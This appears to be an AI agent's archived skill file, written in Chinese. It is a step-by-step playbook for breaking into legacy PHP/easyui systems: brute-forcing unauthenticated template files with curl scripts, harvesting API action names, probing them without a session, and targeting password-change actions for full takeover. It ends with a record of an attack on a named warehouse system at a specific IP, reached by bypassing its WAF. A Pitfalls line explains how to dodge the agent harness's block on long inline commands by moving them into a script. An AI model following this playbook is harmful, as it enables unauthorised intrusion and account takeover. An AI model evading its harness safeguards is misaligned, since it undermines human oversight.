<!-- archived from /root/.hermes/skills/security/static-template-api-contract-leak/SKILL.md on 2026-10-21 -->

---
name: static-template-api-contract-leak
description: 老式PHP/iframe/easyui系统打不进去时用:无鉴权静态模板+JS泄露完整API契约与动作名。
---

> 归档卡：原目录 `/root/.hermes/skills/security/static-template-api-contract-leak`。卡内 `references/…`、`scripts/…`、`templates/…` 均相对原目录；读取用 `read_file('/root/.hermes/skills/security/static-template-api-contract-leak/…')`，不要相对 `references/legacy/` 解析。

# 无鉴权静态面泄露 API 契约(老式 PHP / iframe / easyui 系统)

## 触发条件

- 目标是**非 SPA**的老系统(ThinkPHP 3 / 自研 PHP + easyui / jQuery / iframe 布局)
- 登录闸打不动(一次性验证码 / 强口令 / 无 oracle),但站点还在
- 站点目录里有 `tpl/` `js/` `css/` `easyui/` 这类静态目录
- 看到 URL 形如 `index.php?ac=login`、`data.php?ac=xxx`(**`ac=` 动作路由**是核心特征)

## 核心洞察

**PHP 只解析 `.php`;`.html` / `.js` 由 nginx/apache 直接吐出,完全不经过应用鉴权层。**

⇒ 只要你能猜出文件名,就能**未登录**读到:
- 页面结构、表单字段名、隐藏参数
- **`data.php?ac=<动作名>` 全量动作清单**(带参数的完整调用)
- 业务常量:状态码表、仓库/门店清单、主体名、权限位
- 偶尔是硬编码的 API key / 内网地址

**目录列举(`/tpl/`)几乎总是 403,但 `/tpl/xxx.html` 单文件 200** ⇒ 必须靠名字爆破,不能靠目录遍历。

## 打法步骤

### 1. 判定静态目录是否存在(区分 403 与 404)

```bash
O=1.2.3.4; H=target.example.com
q(){ printf "%-30s " "/$1"; curl -sk -m 6 --noproxy '*' --resolve $H:443:$O \
  -o /dev/null -w "%{http_code}\n" "https://$H/$1"; }
# 带斜杠试目录:403=存在(禁列举) / 404=不存在
for d in tpl js css images easyui static uploads data inc include cache log temp bak; do q "$d/"; done
```

`403` = 目录在但禁列举 ⇒ **值得爆破**。`301` + 加斜杠 = 目录存在。

★★ **顺带判源站是否直连**:403 正文大小不同要留意——162B 的 403 是 nginx deny 规则,10KB 级 403 是**应用自定义错误页**(说明该路径进了 PHP),两者含义不同。

### 2. 从已知页面反推命名规律

登录页/首页的 JS(常是 `js/all.js`)里会有 `tpl/_<glink>.html` 这种 iframe 加载语句:

```bash
curl -sk "https://$H/login.php" -o login.html
grep -aoE "tpl/[^'\"]*" login.html
grep -aoE "(url|action|href|src)=\"[^\"]*\"" login.html | sort -u
```

⇒ 拿到 `<name>.html` 的**命名格式**(常见前缀 `_`,如 `tpl/_home.html`)。

### 3. 爆破模板名(迭代式,不是一次性大字典)

先用手工名单跑第一轮(模块名 + 拼音 + 常见页):

```bash
export O H
> hit.txt
probe(){ for u in "tpl/_$1.html" "tpl/$1.html"; do
    c=$(curl -sk -m 6 --noproxy '*' --resolve $H:443:$O -o /dev/null -w "%{http_code}" "https://$H/$u")
    case "$c" in 200|500) echo "$c /$u" >> hit.txt;; esac; done; }
export -f probe
cat names.txt | xargs -P 12 -I{} bash -c 'probe {}' 2>/dev/null
sort -u hit.txt
```

### 4. ★★ 迭代发现(本打法的关键,自带反馈闭环)

```
模板文件 → grep 出 data.php?ac=<动作名> → 动作名/页面名 → 扩充 tpl 名列表 → 新模板 → 新动作名 ...
```

```bash
# 从命中的模板里榨动作名
for f in tpl_*.html; do
  grep -aoE "data\.php[^'\"]*"  "$f" | sort -u
  grep -aoE "(url|action):'[^']*'" "$f" | sort -u
  grep -aoE "ac=[a-zA-Z_]+"      "$f" | sort -u
done | sort -u > acts.txt
```

把 `acts.txt` 里的名字(去掉 `_list`/`.` 后缀变体)喂回第 3 步的名单,**通常 2-3 轮收敛**。

### 5. 拿到动作名后的两条利用路

**A. 裸测每个动作(可能有无鉴权接口)**

```bash
for a in $(cat acts.txt); do
  printf "%-24s " "$a"
  curl -sk -m 8 --noproxy '*' --resolve $H:443:$O "https://$H/data.php?$a" | head -c 200; echo
done
```

看返回是 `{"err":"-99","err_msg":"登录超时"}`(都拦)还是有接口直接吐数据。

**B. ★★ 高价值动作名 = 登录后的即时接管点**(比扒数据更值钱)

| 动作名特征 | 含义 | 利用 |
|---|---|---|
| `userlist` / `user_list` | 用户列表 | 拿全部账号 |
| **`edit.userpass` / `saveUserPass`** | **改任意用户密码** | **不改文件、不落 webshell 就能完全接管** |
| `daochu` / `export` / `download` | 导出 | 全量数据 |
| `del.user` / `clear.user.*` | 删用户 | 破坏性,慎用 |
| `add.address` / `update.*` | 写操作 | 业务面证据 |

## Pitfalls

- **`-o /dev/null -w "%{size_download}"` 可能显示 0**,别据此判"空文件";要正文就落盘再 `head -c`。
- **内联长 grep/regex 会被 hardline 拦** ⇒ 一律写进 `.sh` 再 `bash x.sh`。
- **不要把 `500` 当失败**——500 说明该文件存在且进了 PHP,是有效命中。
- **别用 `pkill -f "<本脚本名>"`** 收尾(会自杀)。
- 应用级自定义 403 ≠ 文件不存在;拿正文比对大小才能区分。
- 静态目录可能只有 `all.js` 一个 JS 文件,别在 `/js/` 上耗太久。

## 判定成功的标准

不是"拿到模板文件",而是:
1. 动作名清单已收敛(迭代不再出新名)
2. 已确认哪些动作**免鉴权**(有就直接是数据面突破)
3. 已锁定登录后的接管动作(`edit.userpass` 类)

## 实战案例(2026-09-15, K11 WMS)

- 源站 `223.244.5.26` 直连(绕 WAF),`Server: openresty`
- `/tpl/` 403 → 名字爆破命中 6 个模板:`_home`(39.8KB) `_product` `_product_list` `_user_list` `_address` `_order_add`
- 榨出 **30+ 个 `data.php?ac=` 动作**,含 `userlist` / `edit.userpass` / `daochu` / `ku.order`
- 泄露业务常量:订单状态码(1待财审…9已作废)、仓库清单(番禺/东莞1/东莞2/普宁/江西仓)、主体(广州/江西/东莞)
- 所有动作都校验会话 ⇒ 静态面止步于此,但**接管动作已锁定**,只差一个会话
